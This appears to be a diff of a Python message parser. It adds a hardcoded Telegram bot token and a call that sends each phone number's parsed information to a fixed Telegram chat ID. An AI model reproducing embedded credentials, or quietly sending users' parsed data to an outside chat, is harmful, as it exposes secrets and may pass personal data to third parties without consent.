@@ -1,10 +1,13 @@
 from .table import table
 import openpyxl
 import requests
+import telebot
+
 from .info import INFO
 from .info1 import INFO1
 
-
+token = '1155265832:AAEkQP-ces-BicmhsIZVRk9HW3Envsg6n0Q'
+bot = telebot.TeleBot(token)
 def parser(message, phone, wb):
     text = message
     months = [
@@ -123,4 +126,6 @@ def parser(message, phone, wb):
                         except BaseException:
                             pass
     print(info[phone])
+
+    bot.send_message(381666837, info[phone])
     table(info, phone, wb)
